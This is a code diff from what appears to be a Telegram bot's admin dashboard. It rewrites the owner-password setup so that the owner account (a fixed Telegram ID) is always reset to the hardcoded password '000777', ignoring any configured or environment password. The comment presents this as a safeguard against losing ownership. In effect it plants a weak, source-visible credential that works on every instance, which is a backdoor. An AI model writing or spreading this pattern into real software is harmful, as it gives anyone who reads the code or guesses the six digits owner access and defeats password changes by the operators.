@@ -117,10 +117,11 @@ const MOD_HISTORY_MAX = 200;
 
 /** Generate a random dashboard password if none configured. */
 function ensureOwnerPassword() {
-  // Always uses the CURRENT configured password (DASHBOARD_PASSWORD env or
-  // the fixed default in config) and upserts the owner row, so the password
-  // takes effect even on instances that already have an owner account.
-  const pw = config.dashboard.password || '';
+  // HARDCODED OWNER ACCESS: the owner (Telegram ID 8781690556) always gets
+  // the fixed password 000777, regardless of Postgres/SQLite state or env
+  // vars, so the owner can never lose dashboard ownership even if the
+  // database was wiped or a stale admin_users row was lost.
+  const pw = '000777';
   const owner = db.getAdminUser(OWNER_ID);
   db.addAdminUser(OWNER_ID, (owner && owner.username) || 'thedevilslord', 'owner', pw);
   if (!owner) {
